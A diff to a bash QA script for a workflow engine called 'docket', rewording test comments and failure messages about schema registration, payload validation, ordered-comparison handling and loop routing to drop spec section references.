+      "event kinds outside the closed set: $(printf '%s' "$ZG_L_UNKNOWN" | tr '\n' ' ')"
   fi
 
   # Every terminal step has a producing event. A step that reached `done`,
@@ -2121,13 +2124,14 @@ TOML
   check_cond "ZG" "ZG21_run_lifecycle_logged" "the run's activation and completion are not both in the ledger" [ "$ZG_L_RUNEV" -ge 2 ]
 
   # ---------------------------------------------------------------------------
-  # ZG22: §6.14 T3 — the engine REFUSES TO GUESS AN ORDER.
+  # ZG22: the engine REFUSES TO GUESS AN ORDER.
   #
-  # The committed fixture cannot reach T3: its only ordered threshold sits on
-  # `reconcile`, whose stub payload is empty and short-circuits at T4. So a
+  # The committed fixture cannot reach that refusal: its only ordered threshold
+  # sits on `reconcile`, whose stub payload is empty and short-circuits to
+  # false. So a
   # throwaway workflow supplies the case the fixture cannot — an ordered
   # comparison over a NON-EMPTY payload, with no registered schema to declare
-  # the order (schemas are S5's).
+  # the order (schemas arrive at stage 5).
   #
   # The step must PARK `waiting-human` with a reason naming the predicate and
   # the missing schema. That is the difference between an engine that refuses to
@@ -2186,7 +2190,7 @@ ZGT3EOF
   fi
 
   # ---------------------------------------------------------------------------
-  # ZG23: PHASE-4 DORMANCY (§3).
+  # ZG23: PHASE-4 DORMANCY.
   #
   # "Loops/joins/events add no output to any existing verb; the events table is
   # written but has no read verb, so it cannot change any output."
@@ -2201,11 +2205,11 @@ ZGT3EOF
   ZG_D4_EVENTS=$(sqlite3 "$ZG_L/issues.db" "SELECT COUNT(*) FROM events;")
   check_cond "ZG" "ZG23_events_written" "no events after a full looped run; the dormancy checks below prove nothing" [ "$ZG_D4_EVENTS" -gt 0 ]
 
-  # THE READ VERB LANDED AT S6 (runs-dispatch §8), so this assertion INVERTED.
+  # THE READ VERB LANDED AT STAGE 6, so this assertion INVERTED.
   #
   # At S3 it read "`events` is not a verb": the events table was written but had
-  # no reader, which is what made phase 4's dormancy trivially true. §10 puts the
-  # read surface at stage 6, and it is here — so the check now asserts the verb
+  # no reader, which is what made phase 4's dormancy trivially true. The read
+  # surface was planned for stage 6, and it is here — so the check now asserts the verb
   # EXISTS and reads the very run this section built, while the dormancy claim
   # below is carried by the byte-identity checks rather than by the reader's
   # absence.
@@ -2225,7 +2229,7 @@ ZGT3EOF
     check "ZG" "ZG23_events_in_help" "PASS"
   else
     check "ZG" "ZG23_events_in_help" "FAIL" \
-      "the events verb is registered but absent from help; §10 lands the read surface at stage 6"
+      "the events verb is registered but absent from help; the read surface landed at stage 6"
   fi
 
   # A workflow-free repo is untouched by this phase: its output is byte-
@@ -2265,7 +2269,7 @@ ZGT3EOF
   done
   check_cond "ZG" "ZG23_no_loop_vocabulary_leaks" "phase-4 vocabulary reached an existing verb:$ZG_D4_LEAK" [ -z "$ZG_D4_LEAK" ]
 
-  # The §9 item 8 fixture protocol, again at phase 4: 4 -> 7 in ONE pass, with
+  # The fixture protocol, again at phase 4: 4 -> 7 in ONE pass, with
   # the PHASE-4 structures asserted present before the golden diff is trusted.
   local ZG_FX4
   ZG_FX4=$(qa_mktemp_d)
@@ -2315,7 +2319,7 @@ ZGT3EOF
 
 
   # ---------------------------------------------------------------------------
-  # ZG24: `docket schema register|list|show` — the §4.5 refusal matrix.
+  # ZG24: `docket schema register|list|show` — the registration refusal matrix.
   #
   # Every row is asserted by EXIT CODE and by `.code`, because a harness reads
   # one and a human reads the other, and each is followed by a registry-unchanged
@@ -2326,7 +2330,7 @@ ZGT3EOF
   ZG_SC=$(qa_mktemp_d)
   run_env "$ZG_SC" init >/dev/null
 
-  # A fresh repo holds EXACTLY ONE schema — the builtin (§3). Claiming zero
+  # A fresh repo holds EXACTLY ONE schema — the builtin. Claiming zero
   # would have been the flattering statement rather than the true one.
   local SC_SEEDED
   SC_SEEDED=$(sqlite3 "$ZG_SC/issues.db" "SELECT COUNT(*) FROM schemas;")
@@ -2339,8 +2343,8 @@ ZGT3EOF
   assert_json "ZG" "ZG24_list_total" ".data.total" "1"
 
   # A real instance schema. It lives in scripts/qa/fixtures/, which the
-  # genericity gate does not scan, because it is INSTANCE DATA BY LOCATION
-  # (§1.1.1) — the cheapest possible enforcement.
+  # genericity gate does not scan, because it is INSTANCE DATA BY LOCATION —
+  # the cheapest possible enforcement.
   local SC_FILE="$SCRIPT_DIR/qa/fixtures/schemas/findings@1.json"
   check_cond "ZG" "ZG24_fixture_exists" "missing fixture $SC_FILE" [ -f "$SC_FILE" ]
 
@@ -2359,8 +2363,8 @@ ZGT3EOF
     "SELECT row_version FROM schemas WHERE name='findings';")
   check_cond "ZG" "ZG24_reregister_no_bump" "row_version = $SC_ROWV after an idempotent re-register" [ "$SC_ROWV" = "1" ]
 
-  # The derived index is a CACHE of a pure function of the registered bytes
-  # (I2): what `ordered_fields` reports comes from `schemas.ordered`, and it
+  # The derived index is a CACHE of a pure function of the registered bytes.
+  # What `ordered_fields` reports comes from `schemas.ordered`, and it
   # must describe the document `schemas.body` holds.
   local SC_ORDERED
   SC_ORDERED=$(sqlite3 "$ZG_SC/issues.db" \
@@ -2449,8 +2453,8 @@ ZGT3EOF
   fi
 
   # ---------------------------------------------------------------------------
-  # ZG25: cross-validation at `workflow register` (§4.9), and payload validation
-  # at `complete` (§4.8), driven end to end.
+  # ZG25: cross-validation at `workflow register`, and payload validation
+  # at `complete`, driven end to end.
   # ---------------------------------------------------------------------------
 
   cat >"$ZG_SC/cross.toml" <<'TOML'
@@ -2501,7 +2505,7 @@ TOML
   assert_exit "ZG" "ZG25_v21c_exit" 3
   assert_stdout_contains "ZG" "ZG25_v21c_names_rule" "ordered_enum"
 
-  # The run: activate, and the schema JOINS THE PIN SET (§4.7 P1).
+  # The run: activate, and the schema JOINS THE PIN SET.
   run_env "$ZG_SC" issue create -t "ZG25 subject" -d "a body" --json
   local SC_ISSUE
   SC_ISSUE=$(echo "$CMD_STDOUT" | jq -r '.data.id')
@@ -2568,7 +2572,7 @@ TOML
   assert_exit "ZG" "ZG25_valid_payload" 0
 
   # ---------------------------------------------------------------------------
-  # ZG26: GROUP-1 DORMANCY (§3), and the §9.5 golden sensitivity for schema pins.
+  # ZG26: GROUP-1 DORMANCY, and the golden sensitivity for schema pins.
   #
   # The claim: a repo that never registers a SCHEMA behaves byte-identically to
   # v8 on every pre-existing verb, and a schema-less workflow registers,
@@ -2608,7 +2612,7 @@ TOML
   # golden is byte-identical to S4's, and it stays that way now that the fixture
   # declares a `payload`: a payload declaration decides what a step's
   # bytes must SATISFY, never which steps exist. A change here would mean
-  # registering a schema had moved the graph, which nothing in §11.1 permits.
+  # registering a schema had moved the graph, which nothing permits.
   local ZG_S4
   ZG_S4=$(qa_mktemp_d)
   run_env "$ZG_S4" init >/dev/null
@@ -2626,21 +2630,21 @@ TOML
        FROM steps ORDER BY id;")
   check_cond "ZG" "ZG26_s4_topology_identical" "the fixture no longer expands to the S4 topology" [ "$D9_TOPO" = "$(cat "$ZG_GOLD/topology.golden")" ]
 
-  # THE PINS GOLDEN (§4.7, §9.5 level 1). Two schemas: the BUILTIN, which
-  # `reconcile` brings in by being `action = "aggregate"` (P5), and `findings@1`,
-  # which that same step declares (V29).
+  # THE PINS GOLDEN (golden level 1). Two schemas: the BUILTIN, which
+  # `reconcile` brings in by being `action = "aggregate"`, and `findings@1`,
+  # which that same step declares.
   local D9_PINS
   D9_PINS=$(sqlite3 -noheader "$ZG_S4/issues.db" \
     "SELECT kind || '|' || ref || '|' || sha256 FROM pins ORDER BY kind, ref;")
   check_cond "ZG" "ZG26_pins_golden" "the pin set does not match the committed golden" [ "$D9_PINS" = "$(cat "$ZG_GOLD/pins.golden")" ]
 
-  # GOLDEN SENSITIVITY (the ZF4b precedent, extended to schema pins per §4.7):
+  # GOLDEN SENSITIVITY (the ZF4b precedent, extended to schema pins):
   # re-registering the schema at a NEW version and activating a workflow that
   # names it must CHANGE the pin set, or the pin is not being recorded and every
   # assertion above passes vacuously.
   #
   # The two halves run in SEPARATE repos rather than in one, because two versions
-  # of a pipeline both matching one issue is itself a refusal (§11.1's
+  # of a pipeline both matching one issue is itself a refusal (the
   # exactly-one-match rule) — the subject here is the pin, not the binding.
   zg_schema_pin_of() {
     local ZG_SENS_DIR="$1" ZG_SENS_SCHEMA="$2" ZG_SENS_WF="$3"
@@ -2676,7 +2680,7 @@ TOML
   rm -rf "$ZG_SENS_A" "$ZG_SENS_B"
 
   # ---------------------------------------------------------------------------
-  # ZG27: the 4 -> 9 fixture protocol (§4.4.1 U6).
+  # ZG27: the 4 -> 9 fixture protocol.
   #
   # The v9 structures are asserted present BEFORE the golden diff is trusted:
   # a diff against a database that failed to migrate passes vacuously.
@@ -2750,11 +2754,11 @@ TOML
   fi
 
   # ---------------------------------------------------------------------------
-  # ZG28: THE LOOP DRIVEN BY AN ORDERED COMPARISON (§8.1's ten steps).
+  # ZG28: THE LOOP DRIVEN BY AN ORDERED COMPARISON (ten steps).
   #
   # ZG20 drives the loop from `verify`'s EQUALITY threshold, and that case stays
-  # exactly as it was — it is the T1 path and the only proof that equality still
-  # needs no schema. This is the SECOND driver, not a replacement:
+  # exactly as it was — it is the live-equality path and the only proof that
+  # equality still needs no schema. This is the SECOND driver, not a replacement:
   #
   #   reconcile  { "fix-loop" = "any(severity >= high)" }   an ORDERED
   #              comparison over a payload the real `aggregate` computed, with
@@ -2792,9 +2796,9 @@ TOML
     # The clustered payload is recorded on `synthesize` AND NOWHERE ELSE.
     #
     # `reconcile` declares `inputs = ["synthesize.findings"]`, and the builtin's
-    # input is the payloads of the artifacts that declaration names (§2).
+    # input is the payloads of the artifacts that declaration names.
     # NOTHING BELOW CLAIMS OR COMPLETES `reconcile@0` — `claim` refuses
-    # an action step (§6.15) and the ENGINE runs it, which is what makes this
+    # an action step and the ENGINE runs it, which is what makes this
     # section a proof of the production flow rather than of a flow only the QA
     # can produce. The `next` below is the invocation that drives it, exactly as
     # a dispatcher's poll does.
@@ -2841,7 +2845,7 @@ ZGCLUSTEOF
   #                        spread 3 -> HELD; demoted_from `blocker`
   #   C-2 {medium, high}   positions 2,3 -> median -> `medium`
   #                        spread 1 -> not held; demoted_from `high`
-  #   C-3 scalar `info`    the G2 identity: one member, spread 0, nothing held,
+  #   C-3 scalar `info`    the identity case: one member, spread 0, nothing held,
   #                        nothing demoted
   local ZG_A_OUT ZG_A_GOLD ZG_A_WANT
   ZG_A_OUT=$(sqlite3 "$ZG_A/issues.db" \
@@ -2867,7 +2871,7 @@ ZGCLUSTEOF
   check_cond "ZG" "ZG28_demotion_key_absence" "has(demoted_from) = $ZG_A_DEMKEY, want [true,true,false]" [ "$ZG_A_DEMKEY" = "[true,true,false]" ]
 
   # (5) The materialized step exists, is `type=human`, is offered by
-  # `next --run`, and NO DOWNSTREAM STEP IS READY (H8).
+  # `next --run`, and NO DOWNSTREAM STEP IS READY.
   local ZG_A_HELD
   ZG_A_HELD=$(sqlite3 "$ZG_A/issues.db" \
     "SELECT kind || '|' || status || '|' || materialized
@@ -2906,13 +2910,14 @@ ZGCLUSTEOF
       "reconcile@0 is '$ZG_A_GATED', want gated||held"
   fi
 
-  # H11 (as revised): `guard stop` DENIES while a held cluster is open.
+  # `guard stop` DENIES while a held cluster is open.
   run_env "$ZG_A" guard stop
   assert_exit "ZG" "ZG28_guard_stop_denies_while_held" 2
 
   # (6) Approve. The resolved artifact carries operator_resolved, the held one
   # stays addressable, and the saga advanced — the ordered comparison EVALUATED
-  # rather than parking, which is the half T3 used to make impossible.
+  # rather than parking, which is the half the schema-less refusal used to make
+  # impossible.
   local ZG_A_HELDID
   ZG_A_HELDID=$(zg_step_id "$ZG_A" 'reconcile-held@0#0')
   DOCKET_TOKEN="$(conductor_of "$ZG_A" RUN-1)" run_env "$ZG_A" step approve "$ZG_A_HELDID" --authority operator --json
@@ -2945,7 +2950,7 @@ ZGCLUSTEOF
   else
     check "ZG" "ZG28_ordered_comparison_evaluated" "FAIL" \
       "reconcile@0 is '$ZG_A_ROUTE'; over medians low/medium/info the ordered " \
-      "comparison must DECIDE (pass), never PARK — T3 is closed for a declared ordered_enum"
+      "comparison must DECIDE (pass), never PARK — the park is closed for a declared ordered_enum"
   fi
 
   # (7) Downstream is unblocked and the run finishes.
@@ -2994,7 +2999,7 @@ ZGNARROWEOF
   ZG_B_LOOP=$(sqlite3 "$ZG_B/issues.db" "SELECT loop_count FROM run_issues WHERE run_id=1;")
   check_cond "ZG" "ZG28_ordered_loop_entered" "loop_count = $ZG_B_LOOP after an ordered fix-loop routing" [ "$ZG_B_LOOP" = "1" ]
 
-  # And `fix@1` was instantiated by that routing — the loop's §11.3 effect,
+  # And `fix@1` was instantiated by that routing — the loop's effect,
   # reached through an ORDERED comparison rather than through an equality.
   local ZG_B_FIX
   ZG_B_FIX=$(sqlite3 "$ZG_B/issues.db" "SELECT COUNT(*) FROM steps WHERE instance='fix@1';")
@@ -3042,20 +3047,20 @@ ZGNARROWEOF
       WHERE s.instance='reconcile@0' AND a.payload LIKE '%\"held\":true%';")
   check_cond "ZG" "ZG28_rejected_hold_still_addressable" "the held artifact is gone after a rejection" [ "$ZG_C_HELDART" -ge 1 ]
 
-  # H14: the materialized step ends `done` on BOTH paths — it recorded a
+  # The materialized step ends `done` on BOTH paths — it recorded a
   # decision, which is what a gate does.
   local ZG_C_HELDSTATE
   ZG_C_HELDSTATE=$(sqlite3 "$ZG_C/issues.db" \
     "SELECT status FROM steps WHERE instance='reconcile-held@0#0';")
   check_cond "ZG" "ZG28_rejected_step_is_done" "the rejected held step is '$ZG_C_HELDSTATE', want done" [ "$ZG_C_HELDSTATE" = "done" ]
 
-  # H16: a second decision on a resolved hold is CONFLICT (exit 4).
+  # A second decision on a resolved hold is CONFLICT (exit 4).
   DOCKET_TOKEN="$ZG_C_TOKEN" run_env "$ZG_C" step reject "$ZG_C_HELDID" --note "again" --authority operator --json
   assert_exit "ZG" "ZG28_double_decision_conflict" 4
   assert_json "ZG" "ZG28_double_decision_code" ".code" "CONFLICT"
 
   # ---------------------------------------------------------------------------
-  # ZG29: GROUP-2 DORMANCY (§3).
+  # ZG29: GROUP-2 DORMANCY.
   #
   # "`action_results` empty; a run with no `aggregate` step and no `payload`
   # declarations produces byte-identical step/artifact/threshold behavior to S4."
@@ -3069,7 +3074,7 @@ ZGNARROWEOF
   check_cond "ZG" "ZG29_action_results_empty" "$D5_AR action results in a fresh repo" [ "$D5_AR" = "0" ]
 
   # A SCHEMA-LESS, ACTION-LESS workflow: registers, activates, runs, and its
-  # threshold behaves exactly as S3/S4 specified — T1 evaluates, and
+  # threshold behaves exactly as S3/S4 specified — equality evaluates, and
   # `action_results` stays empty because no action ever ran.
   cat >"$ZG_D5/plain.toml" <<'ZGPLAINEOF'
 [pipeline]
@@ -3121,7 +3126,7 @@ ZGPLAINEOF
       "a run with no action step wrote $D5_AR_AFTER action results and $D5_STUB stub artifacts"
   fi
 
-  # T3 still parks for a schema-less ORDERED comparison, with the S3 wording
+  # The engine still parks a schema-less ORDERED comparison, with the S3 wording
   # MINUS its removed tail: a message promising stage 5 after stage 5 has
   # shipped is worse than no message. ZG22's repo is the subject.
   local ZG_T3_ROUTE_NOW
@@ -3132,12 +3137,12 @@ ZGPLAINEOF
     check "ZG" "ZG29_t3_tail_removed" "PASS"
   else
     check "ZG" "ZG29_t3_tail_removed" "FAIL" \
-      "the T3 park reads '$ZG_T3_ROUTE_NOW'"
+      "the schema-less ordered park reads '$ZG_T3_ROUTE_NOW'"
   fi
 
   # ---------------------------------------------------------------------------
   # ZG30: BIND-TO-HIGHEST — the version-bump evolution path, end to end
-  # (engine-spec §11.1 as amended 2026-08-05; found by the M2a toy run).
+  # (amended 2026-08-05; found by a toy run).
   #
   # THE RETRO LOOP COMPLETING IS THE POINT. The retro pipeline's whole output is
   # a bumped workflow version; before the amendment, registering that bump made
